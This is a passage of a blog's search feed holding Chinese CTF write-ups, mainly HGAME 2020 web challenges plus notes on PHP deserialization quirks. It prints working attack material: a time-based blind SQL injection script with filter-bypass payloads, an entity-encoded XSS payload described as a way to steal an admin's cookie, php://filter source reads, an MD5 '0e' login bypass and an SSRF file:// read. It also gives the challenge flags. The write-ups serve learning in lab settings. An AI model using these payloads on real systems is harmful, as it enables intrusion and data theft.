+&lt;h1&gt;人鸡验证&lt;/h1&gt;
+&lt;br&gt;
+&lt;br&gt;
+目前它只支持通过url提交参数来计算两个数的相加，参数为a
+&lt;br&gt;
+&lt;br&gt;
+现在,需要让结果为10
+&lt;/center&gt;</code></pre><p>则提交：</p>
+<pre><code>POST http://codeworld.hgame.day-day.work/?a=5%2B5 HTTP/1.1
+Host: codeworld.hgame.day-day.work
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1</code></pre><p>即可获得flag<br>这里需要注意的是，一般浏览器里会把<code>+</code>认为是空格，这时候提交<code>%2B</code>即可。</p>
+<pre><code>hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre><h2 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h2><h3 id="考察点-3"><a href="#考察点-3" class="headerlink" title="考察点"></a>考察点</h3><p>抓包改包<br>(js代码审计)</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>在游戏过程中进行抓包，发现了一条奇怪的请求</p>
+<pre><code>POST http://cxk.hgame.wz22.cc/submit HTTP/1.1
+Host: cxk.hgame.wz22.cc
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 42
+
+score=400|68ae153a367158c60103d39d867c365a</code></pre><p>这里score=400便是我这次游戏的分数，后面的一串数据之后的代码审计解释。<br>我们进行改包，将400改为他所要求的30000便会得到<code>alert</code>的flag了。</p>
+<pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里我们对游戏的js代码进行审计<br>在<code>game.js</code>中发现这样一段（已格式化）</p>
+<pre><code>gameOver() 
+{
+    let po = &quot;ejIy&quot;;
+    let rt = po + &quot;LmNj&quot;;
+    let rou = &quot;L3N1Ym&quot;;
+    let sche = &quot;aHR0c&quot;;
+    let k = &quot;c2Nv&quot;;
+    let me = sche + &quot;DovL2N&quot;;
+    clearInterval(this.timer)
+    this.context.clearRect(0, 0, this.canvas.width, this.canvas.height)
+    let stamp = md5(Date.parse(new Date()) / 1000); 
+    this.globalScore = this.globalScore + this.storageScore; 
+    this.context.font = &apos;32px Microsoft YaHei&apos;
+    this.context.fillStyle = &apos;#000&apos;
+    this.context.fillText(&apos;CXK，你球掉了！得分：&apos; + this.globalScore, 404, 226)
+    $(&quot;#ballspeedset&quot;).removeAttr(&quot;disabled&quot;); let s = this.globalScore;
+    (
+        function () 
+        { 
+            let getU = me + &quot;4ay5oZ&quot;; 
+            let rl = getU + &quot;2FtZS53&quot;; 
+            let te = rou + &quot;1pdA&quot;; 
+            let ey = k + &quot;cmU=&quot;; 
+            $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
+        }
+    )(); 
+    this.globalScore = 0;
+}</code></pre><p>其中</p>
+<pre><code>    let po = &quot;ejIy&quot;;
+    let rt = po + &quot;LmNj&quot;;
+    let rou = &quot;L3N1Ym&quot;;
+    let sche = &quot;aHR0c&quot;;
+    let k = &quot;c2Nv&quot;;
+    let me = sche + &quot;DovL2N&quot;;
+    let getU = me + &quot;4ay5oZ&quot;; 
+    let rl = getU + &quot;2FtZS53&quot;; 
+    let te = rou + &quot;1pdA&quot;; 
+    let ey = k + &quot;cmU=&quot;; 
+    $.post(atob(rl + rt + te), atob(ey) + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
+
+//其中(长见识了（（（)
+//rl=getUrl, rt=port, te=route, ey=key
+//base64解码后发现完整的post方法为
+$.post(&quot;http://cxk.hgame.wz22.cc/submit&quot;, &quot;score&quot; + &quot;=&quot; + s + &quot;|&quot; + stamp, function (data) { alert(data); }) 
+//即向 http://cxk.hgame.wz22.cc/submit 发送数据score=s|stamp，之后返回的数据会以alert的形式输出
+
+//其中s为我们的游戏分数
+//stamp为
+let stamp = md5(Date.parse(new Date()) / 1000); </code></pre><p>在分析完代码后，我们便可以修改js源码，伪造数据，获得flag</p>
+<pre><code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></pre><h1 id="week-2"><a href="#week-2" class="headerlink" title="week-2"></a>week-2</h1><h2 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h2><h3 id="考察点-4"><a href="#考察点-4" class="headerlink" title="考察点"></a>考察点</h3><p>逻辑漏洞<br>一些php的函数缺陷</p>
+<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h3><p>在最开始可以得到一个登录页面。随即可以发现url疑似可以进行文件包含。<br><a href="http://cosmos-admin.hgame.day-day.work/index.php" target="_blank" rel="noopener">http://cosmos-admin.hgame.day-day.work/index.php</a><strong>?action=login.php</strong><br>将<code>login.php</code>替换为根目录下的<code>/flag</code>返回了<code>Hacker get out</code>应该是被过滤了。<br>尝试用php伪协议中的<code>php://filter/read</code>来进行php源码的读取。<br>得到<code>login.php</code>和<code>index.php</code>的源码。在<code>login.php</code>源码里顺藤摸瓜得到了<code>admin.php</code>文件源码。在其中还知道了一个<code>config.php</code>文件，但被过滤了，无法读取。<br>PS：方便起见这里只展示php源码。</p>
+<p><strong>login.php</strong></p>
+<pre><code>&lt;?php
+include &quot;config.php&quot;;
+session_start();
+
+//Only for debug
+if (DEBUG_MODE){
+    if(isset($_GET[&apos;debug&apos;])) {
+        $debug = $_GET[&apos;debug&apos;];
+        if (!preg_match(&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;, $debug)) {
+            die(&quot;args error!&quot;);
+        }
+        eval(&quot;var_dump($$debug);&quot;);
+    }
+}
+
+if(isset($_SESSION[&apos;username&apos;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+else {
+    if (isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) {
+        if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username){
+            $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];
+            header(&quot;Location: admin.php&quot;);
+            exit();
+        }
+        else {
+            echo &quot;??¨??·???????ˉ?? ?é??èˉˉ&quot;;
+        }
+    }
+}
+?&gt;</code></pre><p><strong>index.php</strong></p>
+<pre><code>&lt;?php
+error_reporting(0);
+session_start();
+
+if(isset($_SESSION[&apos;username&apos;])) {
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+
+$action = @$_GET[&apos;action&apos;];
+$filter = &quot;/config|etc|flag/i&quot;;
+
+if (isset($_GET[&apos;action&apos;]) &amp;&amp; !empty($_GET[&apos;action&apos;])) {
+    if(preg_match($filter, $_GET[&apos;action&apos;])) {
+        echo &quot;Hacker get out!&quot;;
+        exit();
+    }
+        include $action;
+}
+elseif(!isset($_GET[&apos;action&apos;]) || empty($_GET[&apos;action&apos;])) {
+    header(&quot;Location: ?action=login.php&quot;);
+    exit();
+}</code></pre><p><strong>admin.php</strong></p>
+<pre><code>&lt;?php
+include &quot;config.php&quot;;
+session_start();
+if(!isset($_SESSION[&apos;username&apos;])) {
+    header(&apos;Location: index.php&apos;);
+    exit();
+}
+
+function insert_img() {
+    if (isset($_POST[&apos;img_url&apos;])) {
+        $img_url = @$_POST[&apos;img_url&apos;];
+        $url_array = parse_url($img_url);
+        if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) {
+            return false;
+        }   
+        $c = curl_init();
+        curl_setopt($c, CURLOPT_URL, $img_url);
+        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+        $res = curl_exec($c);
+        curl_close($c);
+        $avatar = base64_encode($res);
+
+        if(filter_var($img_url, FILTER_VALIDATE_URL)) {
+            return $avatar;
+        }
+    }
+    else {
+        return base64_encode(file_get_contents(&quot;static/logo.png&quot;));
+    }
+}
+?&gt;
+
+&lt;?php echo insert_img() ? insert_img() : base64_encode(file_get_contents(&quot;static/error.jpg&quot;)); ?&gt;</code></pre><p>可以看到，从<code>index.php</code>的文件包含来获取flag是不太可能了，只能找其它方法。<br>在<code>admin.php</code>中我们可以看到有一个利用base64来读取远程和本地图片的脚本。或许我们可以对其进行利用。但首先我们需要用管理员账号登录上去。<br>随后便可以找到登录验证的代码：</p>
+<pre><code>if ($admin_password == md5($_POST[&apos;password&apos;]) &amp;&amp; $_POST[&apos;username&apos;] === $admin_username)
+{
+    $_SESSION[&apos;username&apos;] = $_POST[&apos;username&apos;];
+    header(&quot;Location: admin.php&quot;);
+    exit();
+}
+else 
+{
+    echo &quot;??¨??·???????ˉ?? ?é??èˉˉ&quot;;
+}</code></pre><p>这样，我们就要想办法得到两个变量的值<code>$admin_password</code>，<code>admin_username</code>。<br>还不难注意到在<code>login.php</code>中有一个debug-mode，只要输入变量，他就会执行eval(“var_dump($$debug);”);来显示变量。这正是我们需要的。<br>得到了账号和md5后的密码：</p>
+<pre><code>username:Cosmos!
+MD5(password):0e114902927253523756713132279690</code></pre><p>可以看到MD5后的密码是<code>0e+数字</code>，且比较时也不是严格比较，所以可以绕过。<br>登录后来到<code>admin.php</code>页面，分析php源码，得到几个重要函数：</p>
+<pre><code>filter_var($img_url, FILTER_VALIDATE_URL);
+//这是一个过滤器函数，通过过滤器来返回过滤的部分。
+parse_url($img_url);
+/*
+这个函数是将一个url拆解为几个部分，如下的url会被拆解为几个部分：
+http://username:password@hostname/path?arg=value#anchor
+Array
+(
+    [scheme] =&gt; http
+    [host] =&gt; hostname
+    [user] =&gt; username
+    [pass] =&gt; password
+    [path] =&gt; /path
+    [query] =&gt; arg=value
+    [fragment] =&gt; anchor
+)
+*/</code></pre><p>在<code>admin.php</code>，中有这么一段代码</p>
+<pre><code>$img_url = @$_POST[&apos;img_url&apos;];
+$url_array = parse_url($img_url);
+...
+if (@$url_array[&apos;host&apos;] !== &quot;localhost&quot; &amp;&amp; $url_array[&apos;host&apos;] !== &quot;timgsa.baidu.com&quot;) 
+{
+    return false;
+} </code></pre><p>它明确要求了文件的host来自<code>localhost</code>或<code>timgsa.baidu.com</code>，否则会导致函数返回<code>false</code>。我们可以使用file协议使条件符合：<br><code>file://localhost/flag</code><br>PS：理论上，file协议也是有host部分的，但这个协议本身就是解析本地文件的，所以被省略了。但还是需要注意host部分必须是localhost，否则会出错。<br>PSS：在我windows本地环境中使用以下php脚本：</p>
+<pre><code>&lt;?php
+$url = &apos;file://localhost/D:/114514.txt&apos;;
+print_r(parse_url($url));
+$c = curl_init();
+curl_setopt($c, CURLOPT_URL, $url);
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$res = curl_exec($c);
+curl_close($c);
+if(filter_var($url, FILTER_VALIDATE_URL))
+{
+    print(&apos;working&apos;);
+    echo $res;
+}
+?&gt;
+
+/*
+Output:
+Array
+(
+    [scheme] =&gt; file
+    [host] =&gt; localhost
+    [path] =&gt; /D:/114514.txt
+)
+working
+
+当$url=&apos;file:///D:/114514.txt&apos;;时
+Array
+(
+    [scheme] =&gt; file
+    [path] =&gt; /D:/114514.txt
+)
+workingいいよ！こいよ！
+*/</code></pre><p>不知道为什么链接解析成功了，但没有<code>114514.txt</code>的文件内容。在5.2.17和7.3.4的环境都试过了，都不行…但在题目中使用<code>file://localhost/flag</code>是可以得到文件内容的…<br>总之得到了flag：</p>
+<pre><code>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</code></pre><h2 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h2><h3 id="考察点-5"><a href="#考察点-5" class="headerlink" title="考察点"></a>考察点</h3><p>sql时间盲注（或许？</p>
+<h3 id="过程-4"><a href="#过程-4" class="headerlink" title="过程"></a>过程</h3><p>说来丢人，这道题最开始手注了很长时间，一直都没有成功。无奈之下使用了sqlmap，发现可以使用时间盲注。<br>这道题过滤了<code>select</code>和空格，不过不是大问题，<code>select</code>大写或双写绕过、空格用<code>/**/</code>绕过。但让我费解的是<code>#</code>和<code>--+</code>虽然没有被过滤，但似乎并没有被sql解析…不知道为什么。不过还是有办法的，用<code>AND/**/&#39;1</code>即可。<br>那不多说了，直接上脚本：</p>
+<pre><code>import requests
+
+mode = input(&quot;plz input use mode:&quot;)
+
+while(True):
+    if(mode == &apos;T&apos;):
+        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(TABLE_NAME)/**/FROM/**/information_schema.TABLES/**/WHERE/**/TABLE_SCHEMA=database()),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
+        break
+
+    elif(mode == &apos;C&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/group_concat(COLUMN_NAME)/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=0x&apos;+tab.encode(&apos;UTF-8&apos;).hex()+&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
+        break
+
+    elif(mode == &apos;F&apos;):
+        tab = input(&apos;plz input tables_name:&apos;)
+        col = input(&apos;plz input col_name:&apos;)
+        payload = &apos;1\&apos;UNION/**/SELECT(if((ascii(substr((SELECT/**/&apos;+ col +&apos;/**/FROM/**/&apos;+ tab +&apos;),%s,1))=%s),sleep(10),1))/**/AND/**/\&apos;1&apos;
+        break
+
+    elif(mode != &apos;F&apos;|&apos;C&apos;|&apos;T&apos;):
+        print(&apos;Error&apos;)
+
+url = &apos;http://139.199.182.61/index.php?id=&apos;
+res = &apos;&apos;
+sel_num = input(&quot;plz input sel_num:&quot;)
+
+for i in range(1,int(sel_num)):
+    print(i)
+    for j in range(32,127):
+        now_payload = payload % (i,j)
+        now_url = url + now_payload
+        try:
+            r = requests.get(url=now_url,timeout=4.5)
+        except:
+            res += chr(j)
+            print(res)
+            break
+print(res)
+
+a = input(&quot;按任意键退出&quot;)
+exit()
+
+# 查到两个表：f1aggggggggggggg,messages
+# flag表中只有一列：fl4444444g
+# 得到flag：hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><p>PS：这个脚本是我根据swpuctf的脚本改编的，修正了上一个脚本的小错误（顺便小小优化了一下代码，避免没必要的操作。</p>
+<pre><code>hgame{w0w_sql_InjeCti0n_Is_S0_IntereSting!!}</code></pre><h2 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h2><h3 id="考察点-6"><a href="#考察点-6" class="headerlink" title="考察点"></a>考察点</h3><p>脚本编写</p>
+<h3 id="过程-5"><a href="#过程-5" class="headerlink" title="过程"></a>过程</h3><p>这道题就是写脚本，首先在主页中可以看到一串变换的字符串，在<code>./mycode</code>中就知道这是token加密后的密文。只有当post的token和服务器的token对应即可获得flag。比较坑的一点是，只有深入尝试后才能知道这道题变化的不只有token，还有加密方式。<br>8说了，上我辣鸡的python脚本：</p>
+<pre><code>import base64
+import requests
+import re
+import codecs
+
+catchPasswd = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;).text)
+# 得密文
+catchCrypt = str(requests.get(&quot;http://7bf62224db.php.hgame.n3ko.co/mycode&quot;).text)
+# 得加密方法
+
+catchPasswd = re.sub(r&apos;(^.*\s)(.*\s)&lt;/span&gt;(.*\s)&lt;/code&gt;&lt;br&gt;.*\s&apos;, &quot;&quot;, catchPasswd)
+catchPasswd = re.sub(r&apos;&lt;br&gt;(.*\s)(.*\s)(.*\s)&lt;/html&gt;&apos;, &quot;&quot;, catchPasswd)
+# 正则消去无用部分
+
+catchCrypt = re.sub(r&apos;(.*\s)(.*\s)(.*\s)echo\(&apos;, &quot;&quot;, catchCrypt)
+catchCrypt = re.sub(r&apos;function(.*\s)(.*\s)(.*\s)(.*\s)(.*\s)&apos;, &quot;&quot;, catchCrypt)
+catchCrypt = re.sub(r&apos;\)\)\)\)\)\)\)\)\)\)\);(.*\s).*\s}&apos;, &quot;&quot;, catchCrypt)
+# 令人智熄的正则（（（
+
+crypt = catchCrypt.split(&quot;(&quot;, 10)
+# 以‘(’为界限，把字符串分割
+
+passwd = catchPasswd
+
+def strrev(string):
+    result = &apos;&apos;.join(reversed(string))
+    return str(result)
+
+def decrypt(string):
+    result = &apos;&apos;
+    for i in range(0,len(string)):
+        result += chr(ord(string[i]) - 1)
+    return str(result)
+
+def base64_decode(string):
+    result = base64.b64decode(string).decode(&apos;utf-8&apos;)
+    return str(result)
+
+def str_rot13(string):
+    result = codecs.getencoder(&quot;rot-13&quot;)(string)
+    return result[0]
+# 各个加密的函数
+
+for i in range(0, 10):
+    if(crypt[i] == &apos;strrev&apos;):
+        passwd = strrev(passwd)
+    elif(crypt[i] == &apos;str_rot13&apos;):
+        passwd = str_rot13(passwd)
+    elif(crypt[i] == &apos;base64_encode&apos;):
+        passwd = base64_decode(passwd)
+    elif(crypt[i] == &apos;encrypt&apos;):
+        passwd = decrypt(passwd)
+# 解密部分，因为固定加密10次，所以循环判断10次即可
+
+send = requests.post(&quot;http://7bf62224db.php.hgame.n3ko.co/&quot;, data={&apos;token&apos; : passwd })
+print(send.text)
+# 打印输送token后得到的网页</code></pre><p>得到flag：</p>
+<pre><code>hgame{5!MPLe-$criPT~WITh_pyThon~OR~PHp}</code></pre><h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><h3 id="考察点-7"><a href="#考察点-7" class="headerlink" title="考察点"></a>考察点</h3><p>XSS<br>md5截断验证</p>
+<h3 id="过程-6"><a href="#过程-6" class="headerlink" title="过程"></a>过程</h3><p>这道题的过滤方式很有趣：<br>1.循环过滤<code>&lt;&gt;</code>以及其之间的所有字符<br>2.<code>script</code>会变为<code>HI THERE!</code><br>3.所有的字符大写<br>不过即使如此也可以进行XSS</p>
+<pre><code>&lt;img src=1 onerror=&apos;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&apos;&lt;
+&lt;!- 即：&lt;img src=1 onerror=&apos;alert(1)&apos;&gt; -&gt;</code></pre><p>1.根据html不严谨的语法规则，即使没有<code>&gt;</code>封闭语句也可以正常显示<br>PS：后端的python代码好像还帮忙补全了后面的<code>&lt;</code>（（（<br>2.使用<code>img</code>标签和<code>onerror</code>事件来避免使用<code>script</code>字符串<br>3.使用实体编码<code>&amp;#(ascii十进制);</code>来规避字符的大写<br>这样就可以盗取管理员的cookie来查看flag了<br>还有，关于实体编码网上还没有可以直接白嫖的，自己拿C瞎打了一个<br>（感觉用C更简单（bin选手憋喷我（</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+int main()
+{
+    char a=0;
+    while(1)
+    {
+        scanf(&quot;%c&quot;, &amp;a);
+        if(a != 0x0A)
+            printf(&quot;&amp;#%d;&quot;, a);
+    }
+    return 0;
+}</code></pre><p>另外，想让管理bot点击页面，还需要发送一段md5截断验证<br>这里直接给白嫖的python脚本（还是多线程的：</p>
+<pre><code>import hashlib
+from multiprocessing.dummy import Pool as ThreadPool
+
+def md5(s): # 计算MD5字符串
+    return hashlib.md5(str(s).encode(&apos;utf-8&apos;)).hexdigest()
+
+keymd5 = input(&quot;set:&quot;)
+md5start = 0
+md5length = 6
+
+def findmd5(sss):
+#已知的md5截断值 # 设置题目已知的截断位置 # 输入范围 里面会进行md5测试
+    key = sss.split(&apos;:&apos;)
+    start = int(key[0])
+    end = int(key[1])
+# 开始位置 # 结束位置
+    result = 0
+    for i in range(start, end): 
+        if md5(i)[0:6] == keymd5:
+            result = i
+            print(result)
+            break
+
+
+list=[] # 参数列表
+for i in range(10):
+    pool = ThreadPool() # 打印 # 拿到加密字符串 # 多线程的数字列表 开始与结尾
+list.append(str(100000000*i) + &apos;:&apos; + str(100000000*(i+1))) # 多线程任务
+pool.map(findmd5, list) # 函数 与参数列表
+pool.close()
+pool.join()</code></pre><p>得到token：<code>f802788a02a51f9c624bb5d91815b</code><br>得到flag：</p>
+<pre><code>hgame{xsS_1s_r3a11y_inTeresT1ng!!}</code></pre>]]></content>
+  </entry>
+  <entry>
+    <title>网鼎杯2020-小知识点</title>
+    <url>/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在网鼎杯中遇见了许多令人迷惑的问题、以及不知道的知识，故在此记录。</p>
+<h1 id="php反序列化中对象属性问题"><a href="#php反序列化中对象属性问题" class="headerlink" title="php反序列化中对象属性问题"></a>php反序列化中对象属性问题</h1><p>在这次的一道php反序列化的一道题中。我们要利用的属性被设置为了<code>protected</code>，这意味着我们的序列化字符串中将会出现<code>%00</code>这个不可见字符，但题目中ban掉了所有不可见字符，需要进行绕过。</p>
+<p>我正当想着怎么绕过，突然有师傅说不必理会那个<code>%00</code>，利用的属性直接按照<code>public</code>得到的序列化字符串也可以被利用。<br>当时的我：？？？？？？？我之前的一道ctf中，因为没有注意到某一个属性的可见性是<code>private</code>导致痛失一题。</p>
+<p>故在这里尝试不同版本php的反序列化处理<br>尝试以下代码</p>
+<pre><code>&lt;?php
+echo phpversion().&apos;&lt;br&gt;&apos;;
+
+class test
+{
+    public $a;
+    private $b;
+    protected $c;
+
+    public function __construct()
+    {
+        $this-&gt;a = 1;
+        $this-&gt;b = 2;
+        $this-&gt;c = 3;
+    }
+
+    private function outputAll()
+    {
+        echo &apos;a:&apos;.$this-&gt;a.&apos;&lt;br&gt;&apos;;
+        echo &apos;b:&apos;.$this-&gt;b.&apos;&lt;br&gt;&apos;;
+        echo &apos;c:&apos;.$this-&gt;c;
+    }
+
+    public function __destruct()
+    {
+        $this-&gt;outputAll();
+    }
+}
+
+if(isset($_GET[&apos;str&apos;]))
+    $obj = unserialize($_GET[&apos;str&apos;]);
+else
+{
+    $obj = new test;
+    echo serialize($obj);
+}</code></pre><p>环境为linux加apache2<br>设置get参数为<code>str=O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;}</code><br>分别获得以下输出</p>
+<pre><code>php:7.4-apache:
+    7.4.5&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3
+php:7.3-apache:
+    7.3.17&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3
+php:7.2-apache:
+    7.2.30&lt;br&gt;a:1&lt;br&gt;b:2&lt;br&gt;c:3
+php:7.1-apache:
+    7.1.33&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c:
+php:7.0-apache:
+    7.0.33&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c:
+php:5.6-apache:
+    5.6.40&lt;br&gt;a:1&lt;br&gt;b:&lt;br&gt;c:</code></pre><p>可以看到，在7.2以后的版本（包括7.2）php在进行反序列化处理时并没有对属性的可见性进行检验<br>这便是矛盾的来源，之后在进行反序列化时，一定要注意php的版本，这上述的情况可能会带来意想不到的漏洞。</p>
+<h1 id="php反序列化中的S类型"><a href="#php反序列化中的S类型" class="headerlink" title="php反序列化中的S类型"></a>php反序列化中的S类型</h1><p>在一个对象被序列化后的字符串中的字符有特殊的含意<br><code>O:4:&quot;test&quot;:3:{s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;s:1:&quot;c&quot;;i:3;}</code><br>在上面的字符串中，O为对象、s为字符串、i为数字…<br>这里要讲一种S类型，S类型指的是是已经被转义的字符串<br>在一个<code>private</code>或<code>protected</code>的对象属性中，序列化后，会有特殊的字符</p>
+<p>以上面的代码为例（PS：%00为hex值为00的字符）<br>序列化b为：<code>s:7:&quot;%00test%00b&quot;;i:2;</code><br>序列化c为：<code>s:4:&quot;%00*%00c&quot;;i:3;</code><br>可以看到，当在浏览器这么输入后，会向服务器发送不可见字符。</p>
+<p>但对于S类型则没有必要了，将s替换为S后：<br>序列化b为：<code>S:7:&quot;\00test\00b&quot;;i:2;</code><br>序列化c为：<code>S:4:&quot;\00*\00c&quot;;i:3;</code><br>这样传入的是3个字符组成的字符串<code>\00</code>而不是<code>00</code>这个不可见字符</p>
+<p>这么做的目的其实在这次的CTF便可以见得。有时候，服务器会BAN掉不可见的字符，防止这些字符导致系统错误。但对于php的反序列化字符串来说，S类型恰好绕过了这个限制。</p>
+<h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>目前就学到这么多（，之后靠复现来学习吧。<br>当时java的xxe试了半天没有出网，还以为payload的锅，结果复现发现一模一样的payload，buuoj可以出网（指靶机内网）。不知道为什么脑壳痛（<br>还有就是吐槽一下那个<code>/web</code>那个目录有点坑（以后先尝试去读一下<code>httpd.conf</code><br>PS：php真是博大精深（（（</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Hello World!!!</title>
+    <url>/2020/02/24/Hello-World-0/</url>
+    <content><![CDATA[<p>您好！欢迎来到我的博客！</p>
+]]></content>
+  </entry>
+</search>
